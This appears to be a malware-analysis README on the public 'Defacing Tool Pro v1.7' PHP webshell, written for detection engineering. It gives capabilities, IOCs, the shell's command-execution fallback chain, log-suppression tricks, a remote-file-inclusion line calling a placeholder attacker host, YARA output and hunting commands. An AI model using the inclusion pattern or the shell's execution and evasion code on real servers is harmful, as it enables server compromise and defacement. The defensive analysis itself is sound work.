<div align="center">

<img src="https://capsule-render.vercel.app/api?type=venom&color=0:050505,40:1a0000,75:8b0000,100:ff2200&height=220&section=header&text=null_byte0x&fontSize=52&fontColor=ffffff&animation=twinkling&fontAlignY=38&desc=PHP%20WEBSHELL%20%7C%20ANALYSIS%20%26%20DETECTION&descSize=13&descAlignY=62" width="100%"/>

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=16&duration=2000&pause=700&color=ff4444&center=true&vCenter=true&width=820&lines=%24+file+dtool_pro17.php+%3E+PHP+script%2C+ASCII+text;%24+grep+%27passthru%5C%7Csystem%5C%7Cpopen%27+dtool_pro17.php;%5B%21%5D+RCE+functions+detected;%24+yara+detections%2Fdtool_pro17.yar+dtool_pro17.php;%5B%2B%5D+PHP_Webshell_DtoolPro17+MATCHED)](https://git.io/typing-svg)

![Type](https://img.shields.io/badge/Type-PHP_Webshell-ff2200?style=for-the-badge)
![Family](https://img.shields.io/badge/Family-Defacing_Tool_Pro_v1.7-8b0000?style=for-the-badge)
![Severity](https://img.shields.io/badge/Severity-CRITICAL-ff0000?style=for-the-badge)
![Language](https://img.shields.io/badge/Language-PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)

</div>

---

> [!CAUTION]
> **This repository documents a malicious PHP webshell for analysis, detection engineering, and defensive research only.**
> The source is a well-known public sample (r3v3ng4ns, 2006). No exploitation of unauthorized systems. See [disclaimer](#disclaimer).

---

## `$ cat overview.md`

**Defacing Tool Pro v1.7** (`dtool_pro17.php`) is a PHP webshell written by `r3v3ng4ns` and originally released as a public, commented script. It provides a browser-based interface for remote command execution on a compromised web server, along with file management, mass defacement, and system fingerprinting capabilities.

```text
 classification
 ├── Type        : Webshell / Remote Code Execution (RCE)
 ├── Language    : PHP (procedural, lightly obfuscated)
 ├── Author      : r3v3ng4ns (revengans@hotmail.com)
 ├── Version     : 1.7.2 (public commented release)
 ├── Deployment  : Upload to web root or inject via LFI/RFI
 └── First seen  : ~2006 (public release)
```

---

## `$ cat capabilities.md`

### Remote Command Execution
The shell supports **5 PHP execution functions**, auto-detected at runtime with fallback ordering:

```
passthru() → system() → exec() → popen() → shell_exec()
```

The user can also manually select which function to use via a dropdown in the UI — a feature designed to bypass servers that disable specific PHP functions.

### Directory Traversal (`chdir`)
A custom `chdir` command allows the attacker to navigate the server filesystem and maintain the current directory between commands, persisting `?chdir=` in the URL.

### File Operations

| Tool | Description |
|---|---|
| **PHPget** | Downloads remote files (HTTP/FTP) up to ~7MB onto the server |
| **PHPwriter** | Writes a defacement page by fetching a remote URL and saving it locally |
| **fileditor** | Opens and edits files directly on the server via browser |
| **overwrite files** | Mass-replaces files matching a keyword (e.g. all `.jpg` files) with attacker content |

### System Fingerprinting
On load, the shell collects:
- `posix_uname()` — kernel name, hostname, OS version, architecture
- UID / EUID / GID of the running process (typically `www-data`, `apache`, `nobody`)
- Server IP via `gethostbyname()`
- Write permission of the current directory
- Presence of `nc`, `wget`, `gcc`, `xterm`, `lynx` on the system

### Evasion
```php
@error_reporting(0);   // suppress all PHP errors
@closelog();           // disable system logger
```
All dangerous function calls are prefixed with `@` to suppress individual errors.

---

## `$ cat iocs.md`

### Strings / File Content
```
Defacing Tool Pro
r3v3ng4ns
revengans@hotmail.com
Dtool Pro v1.7
DTool Pro
```

### Associated Filenames
```
pro17.txt         ← main shell script
safe17.txt        ← safemode variant
writer17.txt      ← PHPwriter helper
get17.txt         ← PHPget helper
feditor.txt       ← file editor
feditor_put.txt   ← file editor save helper
flist.txt         ← file listing helper
help.txt          ← help file
```

### URL Parameters (GET)
```
?fu=      ← function selector (1=passthru, 2=system, 3=exec, 4=popen, 5=shell_exec)
?cmd=     ← command to execute
?chdir=   ← directory to change into
?list=    ← enable file listing mode
?keyw=    ← keyword for mass overwrite
?newf=    ← replacement file URL for mass overwrite
?trydel=  ← delete-and-recreate flag
```

### PHP Functions Combined (detection signal)
```php
passthru()    system()    exec()
popen()       shell_exec()    chdir()
posix_uname() $_GET['cmd']    @error_reporting(0)
```

### RFI Deployment Pattern
```
http://target.com/vuln.php?page=http://attacker.com/pro17.txt?
```

---

## `$ cat static_analysis.md`

### Execution Flow

```
Request arrives
│
├─ @error_reporting(0) + @closelog()        ← evasion
├─ Extract: $fu, $cmd, $chdir, $list        ← from $_GET
├─ posix_uname() + uid/gid fingerprint      ← recon
├─ chdir() handler                          ← navigation
│   └─ custom 'chdir' command parser
├─ ls -F injection                          ← auto-flag enhancement
├─ Function auto-detection                  ← passthru→system→exec→popen→shell_exec
├─ $fe("$cmd 2>&1")                         ← command execution
│   └─ output captured via ob_start()
└─ Render HTML + textarea with output
```

### Key Code Patterns

**Error suppression on load:**
```php
@closelog();
@error_reporting(0);
```

**RCE chain (auto-detected):**
```php
if($funE('passthru'))      { $fe="passthru"; }
elseif($funE('system'))    { $fe="system"; }
elseif($funE('exec'))      { $fe="execc"; }
elseif($funE('popen'))     { $fe="popenn"; }
elseif($funE('shell_exec')){ $fe="shell"; }
else                       { $fe="safemode"; }

$fe("$cmd 2>&1");
```

**Filesystem write (PHPwriter):**
```javascript
// Prompts attacker for a URL to fetch and a local path to write to
// Calls writer17.txt helper to perform the write
```

---

## `$ yara detections/dtool_pro17.yar dtool_pro17.php`

```
PHP_Webshell_DtoolPro17 dtool_pro17.php
0x0:$brand1: Defacing Tool Pro
0x42:$brand2: r3v3ng4ns
0x1a3:$evasion1: @error_reporting(0)
0x198:$evasion2: @closelog()
0x8c1:$get1: $_GET['cmd']
0x8f0:$get2: $_GET['fu']
0x5a2:$cmd1: passthru
0x5b3:$cmd2: shell_exec
```

See [`detections/dtool_pro17.yar`](./detections/dtool_pro17.yar) for the full rule.

---

## `$ cat defensive_notes.md`

### Prevention

```
1. Disable allow_url_include and allow_url_fopen in php.ini
   unless explicitly required by your application.

2. Restrict PHP execution in uploads/, tmp/, and any
   world-writable directory using .htaccess or server config.

3. Validate and whitelist the LFI parameter on vulnerable pages —
   never pass raw user input to include() or require().

4. Apply a WAF rule: block query strings where a parameter value
   begins with http:// or ftp:// on PHP endpoints.
```

### Detection (live environment)

```bash
# Hunt for webshells combining RCE functions with user input
grep -rEl 'passthru|shell_exec|popen|proc_open|system' /var/www \
  | xargs grep -l '\$_GET\|\$_POST\|\$_REQUEST'

# Look for error suppression at the top of PHP files
grep -rn '@error_reporting(0)' /var/www

# Find recently modified PHP files
find /var/www -name '*.php' -newer /var/www/index.php -ls
```

### Hunting with YARA
```bash
yara -r detections/dtool_pro17.yar /var/www/
```

### Response Checklist
- [ ] Identify how the shell was uploaded (LFI, file upload bypass, compromised credentials)
- [ ] Check web server access logs for `?cmd=`, `?fu=`, `?chdir=` parameters
- [ ] Review all files modified around the time of first access
- [ ] Rotate all credentials on the server (DB, FTP, hosting panel)
- [ ] Patch the upload/include vulnerability before restoring service
- [ ] File integrity monitoring going forward

---

## `$ cat disclaimer.txt`

<a name="disclaimer"></a>

> [!WARNING]
> **This analysis is for educational and defensive purposes only.**

```
1. Do not deploy this shell on any system you do not own.
2. Unauthorized access to computer systems is illegal worldwide.
3. The author (null-byte0x) holds zero liability for misuse.
4. This sample is documented to help defenders detect and respond
   to this family — not to enable attacks.
```

---

<div align="center">

[![Back to lab](https://img.shields.io/badge/←_Back_to-malware--analysis--lab-111111?style=for-the-badge&logo=github&logoColor=ff4444)](../README.md)
[![YARA Rule](https://img.shields.io/badge/YARA-dtool__pro17.yar-8b0000?style=for-the-badge)](./detections/dtool_pro17.yar)
[![SAMPLES.md](https://img.shields.io/badge/IOCs-SAMPLES.md-333333?style=for-the-badge)](./SAMPLES.md)

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=14&duration=2500&pause=900&color=ff4444&center=true&vCenter=true&width=600&lines=0x00+Observe.;0x01+Analyze.;0x02+Detect.;0x03+Document.;End+of+transmission._)](https://git.io/typing-svg)

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:ff2200,50:5c0000,100:050505&height=120&section=footer" width="100%"/>

</div>
